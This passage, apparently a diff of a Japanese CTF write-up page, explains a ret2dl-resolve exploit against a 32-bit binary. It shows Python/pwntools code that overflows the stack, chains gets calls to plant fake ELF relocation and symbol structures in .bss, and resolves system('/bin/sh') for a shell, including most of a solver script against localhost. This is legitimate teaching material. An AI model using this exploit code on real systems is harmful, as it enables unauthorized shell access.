-</span></span><span style="display:flex;"><span>  r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  r_offset <span style="color:#f92672">=</span> gets_got
+  r_info   <span style="color:#f92672">=</span> ((fake_elf32_sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span></code></pre></div>
 </div>
 <p>
-    <code>Elf32_Sym</code> 構造体の <code>st_name</code> は、 <code>.dynstr</code> の値から <code>system</code> のシンボルを配置したアドレスまでのオフセットを設定する。
-    このため、事前にオフセットの値を計算し、 <code>Elf32_Sym</code> 構造体に格納しておく。</p>
+    <code>Elf32_Sym</code> 構造体の <code>st_name</code> は、 <code>.dynstr</code> の値から文字列 <code>&#34;system\x00&#34;</code> のアドレスまでのオフセットを設定する。
+    このため、事前にオフセットの値を計算し、 <code>Elf32_Sym</code> 構造体に格納しておく。
+</p>
 <p>
-    <code>st_info</code> は、global変数であることを指す <code>0x12</code> を設定しておく必要があるため、設定しておく。</p>
+    <code>st_info</code> は、グローバル関数であることを指す <code>0x12</code> を設定しておく必要があるため、設定しておく。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
-</span></span><span style="display:flex;"><span>  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
+  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
+  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
+  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span></code></pre></div>
 </div>
-<div id="outline-container-headline-16" class="outline-5">
-<h5 id="headline-16">
+<h5 id="headline-17">
 <code>.bss</code> 領域への作成した構造体やシンボルの格納
 </h5>
-<div id="outline-text-headline-16" class="outline-text-5">
-<p><code>.bss</code> 領域には，以下のように作成した <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体， <code>system</code> のシンボル，および <code>/bin/sh</code> の文字列が格納する．    </p>
+<p>
+<code>.bss</code> 領域には、以下のように作成した <code>Elf32_Rel</code> 構造体と <code>Elf32_Sym</code> 構造体、 <code>&#34;system&#34;</code> のシンボル、および <code>&#34;/bin/sh&#34;</code> の文字列を格納する。    
+</p>
 <pre class="example">
 |-----------+----------.bss-------------+---------|
 | Elf32_Rel | r_offset                  | 8 byte  |
@@ -607,254 +708,93 @@ reloc_arg---+   reroc_arg + .rel.plt         |                                  
 |           | st_size                   |         |
 |           | st_info st_other st_shndx |         |
 |-----------+---------------------------+---------|
-|           |                           | 4byte   |
+|           |                           | 4 byte  |
 |-----------+---------------------------+---------|
-| symbol    | &#39;system&#39;                  | 4byte   |
+| symbol    | 'system'                  | 4 byte  |
 |-----------+---------------------------+---------|
-|           |                           | 4byte   |
+|           |                           | 4 byte  |
 |-----------+---------------------------+---------|
-| argment   | &#39;/bin/sh&#39;                 | 4byte   |
+| argment   | '/bin/sh'                 |  4byte  |
 |-----------+---------------------------+---------|
 |           |                           |         |
 </pre>
-<p>このとき， <code>Elf32_Sym</code> 構造体は， <code>dynsym</code> セクションのアドレスから， <code>0x10</code> byteの間隔で配置されなければならないため( <code>Elf32_Sym</code> 構造体のサイズが <code>0x10</code> byteのため)，
-    必要なbyte数だけalignしている．</p>
 <p>
-    Solverを書くときは，事前に <code>.bss</code> のどのアドレスがどの構造体やシンボルに対応するか計算しておき，ROPで <code>gets</code> の引数として指定しておき，ROPチェインが発火後に，それぞれの構造体やシンボルを書き込んでいく．</p>
+このとき、 <code>Elf32_Sym</code> 構造体は、 <code>.dynsym</code> セクションのアドレスから、 <code>0x10</code> バイトの間隔で配置されなければならないため( <code>Elf32_Sym</code> 構造体のサイズが <code>0x10</code> byteのため)、
+    必要なバイト数だけalignしている。
+</p>
+<p>
+    Solverを書くときは、事前に <code>.bss</code> のどのアドレスがどの構造体やシンボルに対応するか計算しておき、ROPで <code>gets</code> の引数として指定しておき、ROPチェインが発火後に、それぞれの構造体やシンボルを書き込んでいく。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Elf32_Rel_addr <span style="color:#f92672">=</span> bss
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">  fake_elf32_rel_addr <span style="color:#f92672">=</span> bss
+
+  fake_elf32_sym_addr <span style="color:#f92672">=</span> fake_elf32_rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
+
+  system_symbol_addr <span style="color:#f92672">=</span> fake_elf32_sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
+
+  sh_string_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span></code></pre></div>
 </div>
-</div>
-</div>
-<div id="outline-container-headline-17" class="outline-5">
-<h5 id="headline-17">
+<h5 id="headline-18">
 ROPチェインの作成
 </h5>
-<div id="outline-text-headline-17" class="outline-text-5">
-<p>あとは、用意した偽の構造体やシンボルを <code>.bss</code> 領域内に格納できるように、複数回 <code>gets</code> を呼び出す必要がある。</p>
+<p>
+あとは、用意した偽の構造体やシンボルを <code>.bss</code> 領域内に格納できるように、複数回 <code>gets</code> を呼び出す必要がある。
+</p>
 <p>
      そこで、 それぞれ計算しておいた領域に構造体を引数とし、 <code>gets@plt</code> にジャンプするROPを組む。
-     x86のROPは、参考のセキュリティコンテストチャレンジブックが参考になる。</p>
+     x86のROPは、参考文献に挙げたセキュリティコンテストチャレンジブックが参考になる。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span> <span style="color:#75715e"># gets(sh_symbol_addr)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># padding</span>
+ buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
+ buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
+
+ <span style="color:#75715e"># gets(fake_elf32_rel_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(fake_elf32_rel_addr)     <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(fake_elf32_sym_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(fake_elf32_sym_addr)     <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(system_symbol_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
+
+ <span style="color:#75715e"># gets(sh_string_addr)</span>
+ buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
+ buf <span style="color:#f92672">+=</span> p32(sh_string_addr)     <span style="color:#75715e"># gets arg</span></code></pre></div>
 </div>
 <p>
      それぞれの構造体とシンボルの書き込みを行うROPを組んだ後、偽の構造体を元にアドレスを解決させるため、 <code>.plt</code> セクションの先頭にジャンプする。
-     このとき、 <code>system</code> の引数として <code>/bin/sh</code> を取れるように、 <code>/bin/sh</code> が格納されたアドレスをスタックに積んでおく。</p>
+     このとき、 <code>system</code> の引数として <code>&#34;/bin/sh&#34;</code> を取れるように、 <code>&#34;/bin/sh&#34;</code> が格納されたアドレスをスタックに積んでおく。
+</p>
 <div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span> buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span></span></span></code></pre></div>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"> <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
+ buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
+ buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
+ buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># return address of system()</span>
+ buf <span style="color:#f92672">+=</span> p32(sh_string_addr)     <span style="color:#75715e"># system arg</span></code></pre></div>
 </div>
-</div>
-</div>
-</div>
-</div>
-<div id="outline-container-headline-18" class="outline-4">
-<h4 id="headline-18">
-Solver
+<h4 id="headline-19">
+Solver    
 </h4>
-<div id="outline-text-headline-18" class="outline-text-4">
-<div id="outline-container-headline-19" class="outline-5">
-<h5 id="headline-19">
-solve.py
-</h5>
-<div id="outline-text-headline-19" class="outline-text-5">
-<div class="src src-python">
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>  <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./chall&#39;</span>
-</span></span><span style="display:flex;"><span>  chall <span style="color:#f92672">=</span> ELF(filename)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># docker-compose up</span>
-</span></span><span style="display:flex;"><span>  conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">9001</span>)
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># conn = process(filename)</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>  bss <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.bss&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>  rel <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.rel.plt&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>  dynsym <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynsym&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>  dynstr <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>get_section_by_name(<span style="color:#e6db74">&#39;.dynstr&#39;</span>)<span style="color:#f92672">.</span>header<span style="color:#f92672">.</span>sh_addr
-</span></span><span style="display:flex;"><span>  gets_got <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
-</span></span><span style="display:flex;"><span>  gets_plt <span style="color:#f92672">=</span> chall<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># 0x08049022: pop ebx; ret;</span>
-</span></span><span style="display:flex;"><span>  pop_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08049022</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># .bss section</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Rel | r_offset                  | 8 byte  |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | r_info                    |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 8 byte  |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | (align) |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Sym | st_name                   | 16 byte |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_value                  |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_size                   |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_info st_other st_shndx |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | symbol    | &#39;system&#39;                  | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | argment   | &#39;/bin/sh&#39;                 | 4byte   |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           |                           |         |</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  Elf32_Rel_addr <span style="color:#f92672">=</span> bss
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  Elf32_Sym_addr <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  system_symbol_addr <span style="color:#f92672">=</span> Elf32_Sym_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x14</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  sh_symbol_addr <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># calc index of Elf32_Rel from .rel.plt</span>
-</span></span><span style="display:flex;"><span>  reloc_arg <span style="color:#f92672">=</span> Elf32_Rel_addr <span style="color:#f92672">-</span> rel
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x84</span>                 <span style="color:#75715e"># fill stack</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeaf</span>)         <span style="color:#75715e"># saved_ebp</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(Elf32_Rel_addr)</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># main return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(Elf32_Rel_addr)     <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(Elf32_Sym_addr)</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(Elf32_Sym_addr)     <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(system_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(system_symbol_addr) <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># gets(sh_symbol_addr)</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(gets_plt)           <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(pop_ret)            <span style="color:#75715e"># gets return  addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># gets arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># system(&#39;/bin/sh&#39;)</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(plt)                <span style="color:#75715e"># pop ret return addr</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(reloc_arg)          <span style="color:#75715e"># reloc arg</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xdeadbeef</span>)         <span style="color:#75715e"># padding</span>
-</span></span><span style="display:flex;"><span>  buf <span style="color:#f92672">+=</span> p32(sh_symbol_addr)     <span style="color:#75715e"># system arg</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(buf)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create Elf32_Rel</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># typedef struct</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># {</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Addr	r_offset;		/* Address */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	r_info;			/* Relocation type and symbol index */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># } Elf32_Rel;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
-</span></span><span style="display:flex;"><span>  r_offset <span style="color:#f92672">=</span> gets_got
-</span></span><span style="display:flex;"><span>  r_info   <span style="color:#f92672">=</span> ((Elf32_Sym_addr <span style="color:#f92672">-</span> dynsym)<span style="color:#f92672">//</span><span style="color:#ae81ff">0x10</span>)<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">|</span> <span style="color:#ae81ff">7</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Rel | r_offset                  | 8 byte  |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | r_info                    |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  Elf32_Rel <span style="color:#f92672">=</span> p32(r_offset)
-</span></span><span style="display:flex;"><span>  Elf32_Rel <span style="color:#f92672">+=</span> p32(r_info)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  conn<span style="color:#f92672">.</span>sendline(Elf32_Rel)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># create Elf32_Sym</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># typedef struct</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># {</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	st_name;		/* Symbol name (string tbl index) */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Addr	st_value;		/* Symbol value */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Word	st_size;		/* Symbol size */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     unsigned char st_info;		/* Symbol type and binding */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     unsigned char st_other;		/* Symbol visibility */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">#     Elf32_Section st_shndx;		/* Section index */</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># } Elf32_Sym;</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e">###################################################################################</span>
-</span></span><span style="display:flex;"><span>  st_name <span style="color:#f92672">=</span> system_symbol_addr <span style="color:#f92672">-</span> dynstr
-</span></span><span style="display:flex;"><span>  st_value <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_info <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12</span>
-</span></span><span style="display:flex;"><span>  st_other <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>  st_shndx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># | Elf32_Sym | st_name                   | 16 byte |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_value                  |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_size                   |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |           | st_info st_other st_shndx |         |</span>
-</span></span><span style="display:flex;"><span>  <span style="color:#75715e"># |-----------+---------------------------+---------|</span>
-</span></span><span style="display:flex;"><span>  Elf32_Sym <span style="color:#f92672">=</span> p32(st_name)
